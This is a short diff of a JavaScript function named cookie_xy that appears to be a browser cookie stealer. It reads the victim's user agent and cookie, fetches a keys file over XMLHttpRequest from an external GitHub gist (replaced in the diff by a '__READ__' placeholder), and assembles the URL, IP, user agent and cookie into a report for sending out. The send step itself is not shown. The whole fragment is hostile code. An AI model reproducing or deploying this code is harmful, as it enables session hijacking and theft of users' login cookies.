@@ -6,7 +6,7 @@ function cookie_xy(expoCookie){
       var ipx = 'localhost';
       var UAgent = window.navigator.userAgent;
       var xhl = new XMLHttpRequest();
-      xhl.open('GET', 'https://gist.githubusercontent.com/the5orcerer/87fd54148d22081426bb3cada383da44/raw/66ec4b9f48a7b6a73f2d9afa4d24279c91cf0d77/keys.json', false);
+      xhl.open('GET', '__READ__', false);
       xhl.send();
       var extKEY = JSON.parse(xhl.responseText);
       var jsSEC = '--------['+name+']--------\nURL : '+uri+'\nIP : '+ipx+'\nUser-Agent : '+UAgent+'\n\n['+cookie+']\n\n--------[END]--------';
